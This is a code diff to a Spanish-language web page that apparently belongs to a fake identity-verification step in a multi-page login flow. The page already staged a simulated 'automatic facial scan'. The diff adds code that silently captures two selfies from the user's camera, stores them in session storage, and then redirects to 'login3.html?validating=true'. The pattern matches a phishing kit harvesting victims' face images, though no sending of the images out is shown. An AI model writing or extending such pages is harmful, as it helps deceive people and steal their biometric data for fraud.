@@ -100,24 +100,34 @@
 
     <script>
         const video = document.getElementById('camera-feed');
+        let selfieCount = 0;
 
-        // Solicitar acceso a la cámara y empezar el escáner facial automático
+        function captureSelfie() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const selfieDataUrl = canvas.toDataURL('image/png');
+            selfieCount++;
+            sessionStorage.setItem('selfie' + selfieCount, selfieDataUrl);
+        }
+
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
                 .then(stream => {
                     video.srcObject = stream;
-                    
-                    // Simular captura inteligente automática (espera 3.5 segundos con la cámara encendida)
+                    // Captura dos selfies con intervalos
                     setTimeout(() => {
-                        let attempts = parseInt(sessionStorage.getItem('captureAttempts')) || 0;
-                        sessionStorage.setItem('captureAttempts', attempts + 1);
-                        
-                        video.pause(); // Congela el cuadro como si hubiese tomado la foto de golpe
-
+                        captureSelfie(); // Selfie 1
                         setTimeout(() => {
-                            window.location.href = 'login3.html?validating=true';
-                        }, 600); // 0.6 segs de transición y luego redirige
-                    }, 3500); 
+                            captureSelfie(); // Selfie 2
+                            video.pause();
+                            setTimeout(() => {
+                                window.location.href = 'login3.html?validating=true';
+                            }, 600);
+                        }, 2000); // Espera 2 segundos entre selfies
+                    }, 3500); // Espera inicial para selfie 1
                 })
                 .catch(err => {
                     console.error("Error al acceder a la cámara: ", err);
